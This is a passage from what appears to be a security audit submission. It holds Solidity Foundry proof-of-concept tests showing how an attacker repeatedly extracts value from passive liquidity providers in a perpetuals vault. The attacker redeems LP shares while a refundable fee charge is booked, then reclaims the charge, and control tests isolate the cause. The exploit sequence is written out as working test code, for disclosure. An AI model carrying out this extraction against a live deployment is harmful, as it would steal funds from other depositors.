    }

    // =====================================================================
    // 3. Controls
    // =====================================================================

    /// @dev Same trade, no LP exit: the charge/rebate round trip costs the trader the two execution fees and the
    ///      passive LP gains its share of the retained close fee. Proves the extraction needs the LP exit.
    function test_Control_SameTradeWithoutLpExit() public {
        uint256 start = ATTACKER_CAPITAL + TRADER_FUNDING;
        uint256 honestBefore = _honestValue();
        console2.log("control principal before", pool.juniorPrincipal());
        console2.log("control supply before", juniorVault.totalSupply());
        console2.log("control att shares", juniorVault.balanceOf(ATTACKER));
        console2.log("control honest shares", juniorVault.balanceOf(HONEST));

        uint256 posSize = _openMaxSkew();
        console2.log("control principal after open", pool.juniorPrincipal());
        (uint256 seniorP, uint256 juniorP, ,) = pool.getPendingTrancheState();
        console2.log("control senior pending", seniorP);
        console2.log("control junior pending", juniorP);
        _closeAll(posSize);
        console2.log("control principal after close", pool.juniorPrincipal());
        console2.log("control att clearinghouse", clearinghouse.balanceAssets(ATTACKER));
        console2.log("control att claim", engine.traderClaimBalanceAssets(ATTACKER));
        console2.log("control att shares", juniorVault.balanceOf(ATTACKER));
        _withdrawTraderCash();
        console2.log("control att shares value", juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER)));
        console2.log("control principal end", pool.juniorPrincipal());
        console2.log("control supply end", juniorVault.totalSupply());

        int256 attackerPnl = int256(_attackerTotal()) - int256(start);
        int256 honestPnl = int256(_honestValue()) - int256(honestBefore);
        console2.log("control: attacker pnl", attackerPnl < 0 ? uint256(-attackerPnl) : uint256(attackerPnl));
        console2.log("control: honest pnl", honestPnl >= 0 ? uint256(honestPnl) : uint256(-honestPnl));
        assertLt(attackerPnl, 0, "without the LP exit the trader pays the fees");
    }

    /// @dev LP exit with no charge: a redemption at a flat NAV returns the deposit (no value transfer).
    function test_Control_RedeemWithoutCharge() public {
        uint256 start = ATTACKER_CAPITAL + TRADER_FUNDING;
        uint256 honestBefore = _honestValue();
        uint256 attShares = juniorVault.balanceOf(ATTACKER);

        uint256 redeemId = _requestRedeem(juniorVault, ATTACKER, attShares);
        vm.warp(((block.timestamp / 1 hours) + 2) * 1 hours);
        vm.roll(block.number + 2);
        _settleProduction(PAR);
        _claimFunded(redeemId);
        if (juniorVault.balanceOf(address(juniorVault)) > 0) {
            _settleProduction(PAR);
            _claimFunded(redeemId);
        }

        int256 attackerPnl = int256(_attackerTotal()) - int256(start);
        int256 honestPnl = int256(_honestValue()) - int256(honestBefore);
        console2.log("no-charge control: attacker pnl signed", attackerPnl);
        console2.log("no-charge control: honest pnl signed", honestPnl);
        // No trading and no charge: the exit moves only the caller's own capital.
        assertApproxEqAbs(int256(_attackerTotal()), int256(start), 1e6, "redemption at a flat NAV is neutral");
    }
}
```

### PoC source: packages/perps/test/submission/LpVpiCadence.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseBase} from "./ReleaseBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @title LP exit priced on a refundable VPI charge, repeated across epochs
/// @notice Measures the rate limit and repeatability. Each cycle re-enters as an LP, opens a max-skew position,
///         redeems while the refundable charge is booked, then closes and reclaims the charge. Production
///         surfaces only; mocks are Pyth and USDG.
contract LpVpiCadenceTest is ReleaseBase {

    address internal constant HONEST = address(0x1111111111111111111111111111111111111111);
    address internal constant ATTACKER = address(0x2222222222222222222222222222222222222222);

    uint256 internal constant PAR = 1e8;
    uint256 internal constant HONEST_CAPITAL = 1_200_000e6;
    uint256 internal constant ATTACKER_CAPITAL = 1_800_000e6;
    uint256 internal constant TRADER_FUNDING = 300_000e6;
    uint256 internal constant POST_MARGIN = 100_000e6;
    uint256 internal constant SIZE = 1_190_000e18;

    function setUp() public override {
        super.setUp();
        _depositAndClaim(juniorVault, HONEST, HONEST_CAPITAL, PAR);

        uint256 attRequest = _requestDeposit(juniorVault, ATTACKER, ATTACKER_CAPITAL);
        uint256 activation = juniorVault.depositEpochStart(attRequest);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _settleProduction(PAR);
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(attRequest, ATTACKER_CAPITAL, ATTACKER, ATTACKER);

        _fundTrader(ATTACKER, TRADER_FUNDING);
        vm.warp(block.timestamp + 1 hours + 1);
        vm.roll(block.number + 1);
    }

    function _attackerTotal() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + engine.traderClaimBalanceAssets(ATTACKER) + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    }

    function _honestValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(HONEST));
    }

    function _openMaxSkew() internal returns (uint256 posSize) {
        _refreshMark(PAR);
        uint64 id = _commitV3(ATTACKER, CfdTypes.Side.LONG, SIZE, POST_MARGIN, 1, false);
        _executeV3(id, PAR);
        (posSize,,,,,,) = engine.positions(ATTACKER);
    }

    function _closeAll(
        uint256 posSize
    ) internal {
        uint64 id = _commitV3(ATTACKER, CfdTypes.Side.LONG, posSize, 0, type(uint256).max, true);
        _executeV3(id, PAR);
    }

    function _claimFunded(
        uint256 redeemId
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assets = juniorVault.claimableRedeemAssets(redeemId, ATTACKER);
        if (shares > 0) {
            vm.prank(ATTACKER);
            juniorVault.claimRedeem(redeemId, shares, ATTACKER, ATTACKER);
        }
    }

    /// @dev Moves every unit of attacker value back into the Junior vault through the production request path,
    ///      without minting anything: only cash the attacker actually owns is deposited.
    function _reenterAsLp() internal {
        uint256 claim = engine.traderClaimBalanceAssets(ATTACKER);
        if (claim > 0) {
            vm.prank(ATTACKER);
            engine.settleTraderClaim(ATTACKER);
        }
        uint256 cash = settlementToken.balanceOf(ATTACKER);
        require(cash > 0, "no cash to re-enter");
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), cash);
        uint256 requestId = juniorVault.requestDeposit(cash, ATTACKER, ATTACKER);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _settleProduction(PAR);
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(requestId, cash, ATTACKER, ATTACKER);
        vm.warp(block.timestamp + 1 hours + 1);
        vm.roll(block.number + 1);
    }

    /// @dev One full extraction cycle. Returns the attacker's mark-to-market gain for the cycle.
    function _runCycle() internal returns (int256 cyclePnl) {
        uint256 start = _attackerTotal();
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        uint256 redeemId = _requestRedeem(juniorVault, ATTACKER, shares);
        vm.warp(((block.timestamp / 1 hours) + 2) * 1 hours);
        vm.roll(block.number + 2);

        uint256 posSize = _openMaxSkew();
        _settleProduction(PAR);
        _claimFunded(redeemId);
        _closeAll(posSize);
        if (juniorVault.balanceOf(address(juniorVault)) > 0) {
            _settleProduction(PAR);
            _claimFunded(redeemId);
        }
        cyclePnl = int256(_attackerTotal()) - int256(start);
    }

    function test_Finding_ExtractionRepeatsAcrossEpochs() public {
        uint256 honestBefore = _honestValue();
        uint256 attackerBefore = _attackerTotal();

        int256 pnl1 = _runCycle();
        uint256 honest1 = _honestValue();
        _reenterAsLp();
        int256 pnl2 = _runCycle();
        uint256 honest2 = _honestValue();

        console2.log("cycle 1 attacker pnl", pnl1);
        console2.log("cycle 2 attacker pnl", pnl2);
        console2.log("honest before", honestBefore);
        console2.log("honest after cycle 1", honest1);
        console2.log("honest after cycle 2", honest2);

        assertGt(pnl1, 0, "cycle 1 extracts value");
        assertGt(pnl2, 0, "cycle 2 extracts value");
        assertLt(honest1, honestBefore, "passive LP funds cycle 1");
        assertLt(honest2, honest1, "passive LP funds cycle 2");
        assertGt(_attackerTotal(), attackerBefore, "attacker compounds across cycles");
    }
}
```
